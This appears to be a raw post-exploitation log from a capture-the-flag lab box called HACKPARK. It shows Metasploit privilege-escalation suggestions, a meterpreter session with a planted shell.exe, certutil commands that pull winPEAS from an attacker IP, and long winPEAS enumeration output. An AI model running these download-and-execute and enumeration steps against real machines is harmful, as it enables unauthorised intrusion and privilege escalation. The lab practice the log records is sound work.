+  the Registry under the current user hive, and inserting a custom
+  command that will get invoked when the Windows Event Viewer is
+  launched. It will spawn a second shell that has the UAC flag turned
+  off. This module modifies a registry key, but cleans up the key once
+  the payload has been invoked. The module does not require the
+  architecture of the payload to match the OS. If specifying
+  EXE::Custom your DLL should call ExitProcess() after starting your
+  payload in a separate process.
+[+] 10.10.207.167 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+  This module exploits the lack of sanitization of standard handles in
+  Windows' Secondary Logon Service. The vulnerability is known to
+  affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This
+  module will only work against those versions of Windows with
+  Powershell 2.0 or later and systems with two or more CPU cores.
+[+] 10.10.207.167 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+  Module utilizes the Net-NTLMv2 reflection between DCOM/RPC to
+  achieve a SYSTEM handle for elevation of privilege. Currently the
+  module does not spawn as SYSTEM, however once achieving a shell, one
+  can easily use incognito to impersonate the token.
+[+] 10.10.207.167 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
+  This module utilizes the Net-NTLMv2 reflection between DCOM/RPC to
+  achieve a SYSTEM handle for elevation of privilege. It requires a
+  CLSID string. Windows 10 after version 1803, (April 2018 update,
+  build 17134) and all versions of Windows Server 2019 are not
+  vulnerable.
+meterpreter > dir
+Listing: C:\Program Files (x86)\SystemScheduler
+===============================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+40777/rwxrwxrwx   4096     dir   2019-08-04 13:36:53 +0200  Events
+100666/rw-rw-rw-  60       fil   2019-08-04 13:36:42 +0200  Forum.url
+100666/rw-rw-rw-  9813     fil   2019-08-04 13:36:42 +0200  License.txt
+100666/rw-rw-rw-  871      fil   2019-08-04 13:37:02 +0200  LogFile.txt
+100666/rw-rw-rw-  2805     fil   2019-08-04 13:36:53 +0200  LogfileAdvanced.txt
+100777/rwxrwxrwx  536992   fil   2019-08-04 13:36:42 +0200  Message.exe
+40777/rwxrwxrwx   0        dir   2020-08-07 07:36:25 +0200  Microsoft
+100777/rwxrwxrwx  445344   fil   2019-08-04 13:36:42 +0200  PlaySound.exe
+100777/rwxrwxrwx  27040    fil   2019-08-04 13:36:42 +0200  PlayWAV.exe
+100666/rw-rw-rw-  149      fil   2019-08-04 13:36:53 +0200  Preferences.ini
+100777/rwxrwxrwx  485792   fil   2019-08-04 13:36:42 +0200  Privilege.exe
+100666/rw-rw-rw-  10100    fil   2019-08-04 13:36:42 +0200  ReadMe.txt
+100777/rwxrwxrwx  112544   fil   2019-08-04 13:36:42 +0200  RunNow.exe
+100777/rwxrwxrwx  235936   fil   2019-08-04 13:36:42 +0200  SSAdmin.exe
+100777/rwxrwxrwx  731552   fil   2019-08-04 13:36:42 +0200  SSCmd.exe
+100777/rwxrwxrwx  456608   fil   2019-08-04 13:36:42 +0200  SSMail.exe
+100777/rwxrwxrwx  1633696  fil   2019-08-04 13:36:42 +0200  Scheduler.exe
+100777/rwxrwxrwx  491936   fil   2019-08-04 13:36:42 +0200  SendKeysHelper.exe
+100777/rwxrwxrwx  437664   fil   2019-08-04 13:36:42 +0200  ShowXY.exe
+100777/rwxrwxrwx  439712   fil   2019-08-04 13:36:42 +0200  ShutdownGUI.exe
+100666/rw-rw-rw-  785042   fil   2019-08-04 13:36:42 +0200  WSCHEDULER.CHM
+100666/rw-rw-rw-  703081   fil   2019-08-04 13:36:42 +0200  WSCHEDULER.HLP
+100777/rwxrwxrwx  136096   fil   2019-08-04 13:36:42 +0200  WSCtrl.exe
+100777/rwxrwxrwx  68512    fil   2019-08-04 13:36:42 +0200  WSLogon.exe
+100666/rw-rw-rw-  33184    fil   2019-08-04 13:36:42 +0200  WSProc.dll
+100666/rw-rw-rw-  2026     fil   2019-08-04 13:36:42 +0200  WScheduler.cnt
+100777/rwxrwxrwx  331168   fil   2019-08-04 13:36:42 +0200  WScheduler.exe
+100777/rwxrwxrwx  98720    fil   2019-08-04 13:36:42 +0200  WService.exe
+100666/rw-rw-rw-  54       fil   2019-08-04 13:36:42 +0200  Website.url
+100777/rwxrwxrwx  76704    fil   2019-08-04 13:36:42 +0200  WhoAmI.exe
+100666/rw-rw-rw-  1150     fil   2019-08-04 13:36:42 +0200  alarmclock.ico
+100666/rw-rw-rw-  766      fil   2019-08-04 13:36:42 +0200  clock.ico
+100666/rw-rw-rw-  80856    fil   2019-08-04 13:36:42 +0200  ding.wav
+100666/rw-rw-rw-  1637972  fil   2019-08-04 13:36:42 +0200  libeay32.dll
+100777/rwxrwxrwx  40352    fil   2019-08-04 13:36:42 +0200  sc32.exe
+100666/rw-rw-rw-  766      fil   2019-08-04 13:36:42 +0200  schedule.ico
+100666/rw-rw-rw-  355446   fil   2019-08-04 13:36:42 +0200  ssleay32.dll
+100666/rw-rw-rw-  6999     fil   2019-08-04 13:36:42 +0200  unins000.dat
+100777/rwxrwxrwx  722597   fil   2019-08-04 13:36:42 +0200  unins000.exe
+100666/rw-rw-rw-  6574     fil   2019-08-04 13:36:42 +0200  whiteclock.ico
+
+meterpreter > cd C:/Users/Public
+meterpreter > dir
+Listing: C:\Users\Public
+========================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Desktop
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Documents
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Downloads
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Libraries
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Music
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Pictures
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Videos
+100666/rw-rw-rw-  174    fil   2013-08-22 17:39:32 +0200  desktop.ini
+100777/rwxrwxrwx  73802  fil   2020-08-07 07:03:51 +0200  shell.exe
+
+meterpreter > certutil -urlcache -split -f http://10.11.8.65/winPEAS.exe
+[-] Unknown command: certutil.
+meterpreter > shell
+Process 1920 created.
+Channel 7 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\Public>certutil -urlcache -split -f http://10.11.8.65/winPEAS.exe
+certutil -urlcache -split -f http://10.11.8.65/winPEAS.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\Public>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+
+ Directory of C:\Users\Public
+
+08/06/2020  10:46 PM    <DIR>          .
+08/06/2020  10:46 PM    <DIR>          ..
+08/06/2020  10:46 PM            85,179 Blob0_0.key
+08/22/2013  08:39 AM    <DIR>          Documents
+08/22/2013  08:39 AM    <DIR>          Downloads
+08/22/2013  08:39 AM    <DIR>          Music
+08/22/2013  08:39 AM    <DIR>          Pictures
+08/06/2020  10:03 PM            73,802 shell.exe
+08/22/2013  08:39 AM    <DIR>          Videos
+08/06/2020  10:46 PM            85,179 winPEAS.exe
+               3 File(s)        244,160 bytes
+               7 Dir(s)  38,401,662,976 bytes free
+
+C:\Users\Public>winPEAS.exe
+winPEAS.exe
+This version of C:\Users\Public\winPEAS.exe is not compatible with the version of Windows you're running. Check your computer's system information and then c
+ontact the software publisher.
+
+C:\Users\Public>certutil -urlcache -split -f http://10.11.8.65/winPEAS.bat
+certutil -urlcache -split -f http://10.11.8.65/winPEAS.bat
+****  Online  ****
+  0000  ...
+  80d0
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\Public>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+
+ Directory of C:\Users\Public
+
+08/06/2020  10:46 PM    <DIR>          .
+08/06/2020  10:46 PM    <DIR>          ..
+08/06/2020  10:46 PM            85,179 Blob0_0.key
+08/22/2013  08:39 AM    <DIR>          Documents
+08/22/2013  08:39 AM    <DIR>          Downloads
+08/22/2013  08:39 AM    <DIR>          Music
+08/22/2013  08:39 AM    <DIR>          Pictures
+08/06/2020  10:03 PM            73,802 shell.exe
+08/22/2013  08:39 AM    <DIR>          Videos
+08/06/2020  10:46 PM            32,976 winPEAS.bat
+08/06/2020  10:46 PM            85,179 winPEAS.exe
+               4 File(s)        277,136 bytes
+               7 Dir(s)  38,401,626,112 bytes free
+
+C:\Users\Public>winPEAS.bat
+winPEAS.bat
+            *((,.,/((((((((((((((((((((/,  */
+     ,/*,..*(((((((((((((((((((((((((((((((((,
+   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
+   ((((((((((((((((* *****,,,/########## .(* ,((((((
+   (((((((((((/* ******************/####### .(. ((((((
+   ((((((..******************/@@@@@/***/######* /((((((
+   ,,..**********************@@@@@@@@@@(***,#### ../(((((
+   , ,**********************#@@@@@#@@@@*********##((/ /((((
+   ..(((##########*********/#@@@@@@@@@/*************,,..((((
+   .(((################(/******/@@@@@#****************.. /((
+   .((########################(/************************..*(
+   .((#############################(/********************.,(
+   .((##################################(/***************..(
+   .((######################################(************..(
+   .((######(,.***.,(###################(..***(/*********..(
+  .((######*(#####((##################((######/(********..(
+   .((##################(/**********(################(**...(
+   .(((####################/*******(###################.((((
+   .(((((############################################/  /((
+   ..(((((#########################################(..(((((.
+   ....(((((#####################################( .((((((.
+   ......(((((#################################( .(((((((.
+   (((((((((. ,(############################(../(((((((((.
+       (((((((((/,  ,####################(/..((((((((((.
+             (((((((((/,.  ,*//////*,. ./(((((((((((.
+                (((((((((((((((((((((((((((/"
+                       by carlospolop
+ECHO is off.
+Advisory: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibili
+ty of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+ECHO is off.
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] BASIC SYSTEM INFO <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WINDOWS OS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check for vulnerabilities for the OS version with the applied patches
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
+
+Host Name:                 HACKPARK
+OS Name:                   Microsoft Windows Server 2012 R2 Standard Evaluation
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00252-10000-00000-AA228
+Original Install Date:     8/3/2019, 10:43:23 AM
+System Boot Time:          8/6/2020, 9:58:41 PM
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Xen 4.2.amazon, 8/24/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     4,096 MB
+Available Physical Memory: 3,052 MB
+Virtual Memory: Max Size:  5,504 MB
+Virtual Memory: Available: 4,355 MB
+Virtual Memory: In Use:    1,149 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 8 Hotfix(s) Installed.
+                           [01]: KB2919355
+                           [02]: KB2919442
+                           [03]: KB2937220
+                           [04]: KB2938772
+                           [05]: KB2939471
+                           [06]: KB2949621
+                           [07]: KB3035131
+                           [08]: KB3060716
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: AWS PV Network Device
+                                 Connection Name: Ethernet 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.0.1
+                                 IP address(es)
+                                 [01]: 10.10.207.167
+                                 [02]: fe80::b0b1:b17d:e0f5:4048
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+Caption                                     Description      HotFixID   InstalledOn
+http://support.microsoft.com/?kbid=2919355  Update           KB2919355  3/21/2014
+http://support.microsoft.com/?kbid=2919442  Update           KB2919442  3/21/2014
+http://support.microsoft.com/?kbid=2937220  Update           KB2937220  3/21/2014
+http://support.microsoft.com/?kbid=2938772  Update           KB2938772  3/21/2014
+http://support.microsoft.com/?kbid=2939471  Update           KB2939471  3/21/2014
+http://support.microsoft.com/?kbid=2949621  Hotfix           KB2949621  3/21/2014
+http://support.microsoft.com/?kbid=3035131  Security Update  KB3035131  8/5/2019
+http://support.microsoft.com/?kbid=3060716  Security Update  KB3060716  8/5/2019
+
+
+
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] DATE and TIME <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] You may need to adjust your local date/time to exploit some vulnerability
+Thu 08/06/2020
+10:46 PM
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Audit Settings <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check what is being logged
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WEF Settings <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check where are being sent the logs
+ERROR: The system was unable to find the specified registry key or value.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] LAPS installed? <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check what is being logged
+ERROR: The system was unable to find the specified registry key or value.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] LSA protection? <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Active if "1"
+
+
+ERROR: The system was unable to find the specified registry key or value.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Credential Guard? <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Active if "1" or "2"
+
+
+ERROR: The system was unable to find the specified registry key or value.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WDigest? <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Plain-text creds in memory if "1"
+ERROR: The system was unable to find the specified registry key or value.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Number of cached creds <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] You need System to extract them
+
+
+ERROR: The system was unable to find the specified registry key or value.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] UAC Settings <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+    EnableLUA    REG_DWORD    0x1
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Registered Anti-Virus(AV) <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+ERROR:
+Description = Invalid namespace
+
+
+
+Checking for defender whitelisted PATHS
+ERROR: The system was unable to find the specified registry key or value.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] PS settings <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+PowerShell v2 Version:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
+    PowerShellVersion    REG_SZ    2.0
+
+PowerShell v5 Version:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine
+    PowerShellVersion    REG_SZ    4.0
+
+Transcriptions Settings:
+ERROR: The system was unable to find the specified registry key or value.
+Module logging settings:
+ERROR: The system was unable to find the specified registry key or value.
+Scriptblog logging settings:
+ERROR: The system was unable to find the specified registry key or value.
+
+PS default transcript history
+The system cannot find the file specified.
+
+Checking PS history file
+The system cannot find the path specified.
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] MOUNTED DISKS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Maybe you find something interesting
+Caption
+C:
+
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] ENVIRONMENT <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Interesting information?
+ALLUSERSPROFILE=C:\ProgramData
+CommonProgramFiles=C:\Program Files (x86)\Common Files
+CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
+CommonProgramW6432=C:\Program Files\Common Files
+COMPUTERNAME=HACKPARK
+ComSpec=C:\Windows\system32\cmd.exe
+expl=no
+FP_NO_HOST_CHECK=NO
+long=no
+NUMBER_OF_PROCESSORS=2
+OS=Windows_NT
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+PROCESSOR_ARCHITECTURE=x86
+PROCESSOR_ARCHITEW6432=AMD64
+PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
+PROCESSOR_LEVEL=6
+PROCESSOR_REVISION=4f01
+ProgramData=C:\ProgramData
+ProgramFiles=C:\Program Files (x86)
+ProgramFiles(x86)=C:\Program Files (x86)
+ProgramW6432=C:\Program Files
+PROMPT=$P$G
+PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+PUBLIC=C:\Users\Public
+SystemDrive=C:
+SystemRoot=C:\Windows
+TEMP=C:\Windows\TEMP
+TMP=C:\Windows\TEMP
+USERDOMAIN=IIS APPPOOL
+USERNAME=Blog
+USERPROFILE=C:\Users\Default
+windir=C:\Windows
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] INSTALLED SOFTWARE <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Some weird software? Check for vulnerabilities in unknow software installed
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
+Amazon
+Common Files
+Common Files
+Internet Explorer
+Internet Explorer
+Microsoft.NET
+SystemScheduler
+Windows Mail
+Windows Mail
+Windows NT
+Windows NT
+WindowsPowerShell
+WindowsPowerShell
+    InstallLocation    REG_SZ    C:\Program Files (x86)\SystemScheduler\
+    InstallLocation    REG_SZ    C:\Program Files (x86)\SystemScheduler\
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Remote Desktop Credentials Manager <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WSUS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] RUNNING PROCESSES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Something unexpected is running? Check for vulnerabilities
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
+
+Image Name                     PID Services
+========================= ======== ============================================
+System Idle Process              0 N/A
+System                           4 N/A
+smss.exe                       372 N/A
+csrss.exe                      532 N/A
+csrss.exe                      584 N/A
+wininit.exe                    592 N/A
+winlogon.exe                   624 N/A
+services.exe                   676 N/A
+lsass.exe                      684 SamSs
+svchost.exe                    744 BrokerInfrastructure, DcomLaunch, LSM,
+                                   PlugPlay, Power, SystemEventsBroker
+svchost.exe                    788 RpcEptMapper, RpcSs
+svchost.exe                    872 Dhcp, EventLog, lmhosts, Wcmsvc
+dwm.exe                        888 N/A
+svchost.exe                    916 CertPropSvc, DsmSvc, gpsvc, iphlpsvc,
+                                   LanmanServer, ProfSvc, Schedule, SENS,
+                                   SessionEnv, ShellHWDetection, Themes,
+                                   Winmgmt
+svchost.exe                    944 EventSystem, FontCache, netprofm, nsi,
+                                   W32Time, WinHttpAutoProxySvc
+svchost.exe                    348 CryptSvc, Dnscache, LanmanWorkstation,
+                                   NlaSvc, WinRM
+svchost.exe                    988 BFE, DPS, MpsSvc
+spoolsv.exe                   1132 Spooler
+amazon-ssm-agent.exe          1168 AmazonSSMAgent
+svchost.exe                   1248 AppHostSvc
+LiteAgent.exe                 1276 AWSLiteAgent
+svchost.exe                   1332 TrkWks, UALSVC, UmRdpService
+svchost.exe                   1348 W3SVC, WAS
+WService.exe                  1380 WindowsScheduler
+wlms.exe                      1552 WLMS
+WScheduler.exe                1560 N/A
+Ec2Config.exe                 1576 Ec2Config
+w3wp.exe                      1736 N/A
+svchost.exe                   1868 TermService
+sppsvc.exe                    1988 sppsvc
+WmiPrvSE.exe                  2412 N/A
+taskhostex.exe                2608 N/A
+explorer.exe                  2684 N/A
+ServerManager.exe             1220 N/A
+SppExtComObj.Exe              1148 N/A
+WScheduler.exe                3008 N/A
+msdtc.exe                     2536 MSDTC
+cmd.exe                       1584 N/A
+conhost.exe                   2348 N/A
+shell.exe                     2948 N/A
+cmd.exe                       2312 N/A
+conhost.exe                    672 N/A
+cmd.exe                       1920 N/A
+conhost.exe                   2328 N/A
+WmiPrvSE.exe                  1160 N/A
+TrustedInstaller.exe          1224 TrustedInstaller
+TiWorker.exe                  2344 N/A
+tasklist.exe                  1472 N/A
+
+[i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)
+C:\Users\Public\shell.exe BUILTIN\Administrators:(I)(F)
+                          IIS APPPOOL\Blog:(I)(F)
+
+C:\Windows\SysWOW64\cmd.exe NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWOW64\cmd.exe NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWOW64\cmd.exe NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWOW64\Wbem\WMIC.exe NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWOW64\find.exe NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWOW64\find.exe NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWOW64\find.exe NT SERVICE\TrustedInstaller:(F)
+
+
+[i] Checking directory permissions of running processes (DLL injection)
+C:\Users\Public\ BUILTIN\Administrators:(OI)(CI)(F)
+
+C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWOW64\wbem\ NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] RUN AT STARTUP <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] AlwaysInstallElevated? <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] If '1' then you can install a .msi file with admin privileges ;)
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] NETWORK <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CURRENT SHARES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+System error 5 has occurred.
+
+Access is denied.
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] INTERFACES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : hackpark
+   Primary Dns Suffix  . . . . . . . :
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : eu-west-1.compute.internal
+
+Ethernet adapter Ethernet 2:
+
+   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
+   Description . . . . . . . . . . . : AWS PV Network Device #0
+   Physical Address. . . . . . . . . : 02-FB-C2-1E-7F-0F
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::b0b1:b17d:e0f5:4048%14(Preferred)
+   IPv4 Address. . . . . . . . . . . : 10.10.207.167(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Lease Obtained. . . . . . . . . . : Thursday, August 6, 2020 9:59:35 PM
+   Lease Expires . . . . . . . . . . : Thursday, August 6, 2020 11:29:35 PM
+   Default Gateway . . . . . . . . . : 10.10.0.1
+   DHCP Server . . . . . . . . . . . : 10.10.0.1
+   DHCPv6 IAID . . . . . . . . . . . : 335943906
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-DA-49-4B-08-00-27-7A-66-52
+   DNS Servers . . . . . . . . . . . : 10.0.0.2
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+Tunnel adapter isatap.eu-west-1.compute.internal:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] USED PORTS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check for services restricted from the outside
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       788
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1868
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       592
+  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       872
+  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       916
+  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       1132
+  TCP    0.0.0.0:49162          0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:49163          0.0.0.0:0              LISTENING       676
+  TCP    10.10.207.167:139      0.0.0.0:0              LISTENING       4
+  TCP    [::]:80                [::]:0                 LISTENING       4
+  TCP    [::]:135               [::]:0                 LISTENING       788
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:3389              [::]:0                 LISTENING       1868
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49152             [::]:0                 LISTENING       592
+  TCP    [::]:49153             [::]:0                 LISTENING       872
+  TCP    [::]:49154             [::]:0                 LISTENING       916
+  TCP    [::]:49155             [::]:0                 LISTENING       1132
+  TCP    [::]:49162             [::]:0                 LISTENING       684
+  TCP    [::]:49163             [::]:0                 LISTENING       676
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] FIREWALL <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+Firewall status:
+-------------------------------------------------------------------
+Profile                           = Standard
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Disable
+Group policy version              = Windows Firewall
+Remote admin mode                 = Disable
+
+Ports currently open on all network interfaces:
+Port   Protocol  Version  Program
+-------------------------------------------------------------------
+No ports are currently open on all network interfaces.
+
+IMPORTANT: Command executed successfully.
+However, "netsh firewall" is deprecated;
+use "netsh advfirewall firewall" instead.
+For more information on using "netsh advfirewall firewall" commands
+instead of "netsh firewall", see KB article 947709
+at http://go.microsoft.com/fwlink/?linkid=121488 .
+
+
+
+Domain profile configuration:
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Disable
+
+Service configuration for Domain profile:
+Mode     Customized  Name
+-------------------------------------------------------------------
+Enable   No          Remote Desktop
+
+Allowed programs configuration for Domain profile:
+Mode     Traffic direction    Name / Program
+-------------------------------------------------------------------
+
+Port configuration for Domain profile:
+Port   Protocol  Mode    Traffic direction     Name
+-------------------------------------------------------------------
+
+ICMP configuration for Domain profile:
+Mode     Type  Description
+-------------------------------------------------------------------
+Enable   2     Allow outbound packet too big
+
+Standard profile configuration (current):
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Disable
+
+Service configuration for Standard profile:
+Mode     Customized  Name
+-------------------------------------------------------------------
+Enable   No          Remote Desktop
+
+Allowed programs configuration for Standard profile:
+Mode     Traffic direction    Name / Program
+-------------------------------------------------------------------
+
